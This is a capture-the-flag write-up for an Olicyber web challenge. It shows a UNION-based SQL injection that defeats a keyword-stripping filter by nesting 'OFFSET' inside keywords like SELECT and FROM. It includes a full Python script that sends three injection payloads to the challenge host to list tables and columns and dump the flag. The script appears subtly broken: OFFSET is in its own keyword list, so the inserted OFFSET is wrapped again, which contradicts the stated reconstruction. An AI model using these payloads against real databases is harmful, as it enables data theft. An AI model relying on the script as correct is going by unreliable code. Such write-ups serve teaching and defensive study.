---
title: "No Time — UNION SQL Injection with Keyword Filter Bypass via OFFSET Injection"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "sqli", "filter-bypass", "union-based", "python"]
difficulty: "intermediate"
summary: "A WAF strips forbidden SQL keywords. Inject OFFSET inside reserved words (SELECT → SELOFFSETECT) so after the WAF removes OFFSET the original keyword is reconstructed, landing a UNION SELECT to dump the flag."
---

## The Challenge

A search endpoint runs user input through a SQL query. A keyword blacklist strips commonly known SQL injection strings before the query executes. `SELECT`, `FROM`, `WHERE`, `UNION` and their variants are filtered.

## Approach

If the WAF removes the literal string `OFFSET` from the input before passing it to the database, injecting `OFFSET` inside a forbidden keyword exploits that removal to reconstruct the original keyword:

```
SELOFFSETECT  →  after stripping OFFSET  →  SELECT
FROFFSETOM    →  after stripping OFFSET  →  FROM
UNOFFSETion   →  after stripping OFFSET  →  UNION
WOFFSETHERE   →  after stripping OFFSET  →  WHERE
```

The sanitiser runs once, the resulting string goes directly to the database without re-checking.

## Solution

```python
import requests

site = "http://no-time.challs.olicyber.it/search"
keywords = ["SELECT", "FROM", "WHERE", "UNION", "OFFSET"]

def inject(test):
    for keyword in keywords:
        test = test.replace(keyword, f"{keyword[:3]}OFFSET{keyword[3:]}")
    return test

payload_raw = "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = database() -- "
payload = inject(payload_raw)
r = requests.post(site, data={"query": payload})
print("TABLES:", r.text)

payload2_raw = "' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'flags' -- "
payload2 = inject(payload2_raw)
r2 = requests.post(site, data={"query": payload2})
print("COLUMNS:", r2.text)

payload3_raw = "' UNION SELECT flag FROM flags -- "
payload3 = inject(payload3_raw)
r3 = requests.post(site, data={"query": payload3})
print("FLAG:", r3.text)
```

`inject()` splits every reserved keyword at the third character and inserts `OFFSET` — the WAF removes the literal `OFFSET` substring from the output and the original keyword is reassembled. Three queries: enumerate tables → enumerate columns → dump flag.

## What I Learned

Input sanitisation via substring stripping is fragile. Filters must be applied in a loop until no change occurs (idempotent), or ideally replaced with parameterised queries entirely. Injecting the filter's own removal target inside the forbidden string is a classic bypass demonstrated in almost every SQLi filter challenge.
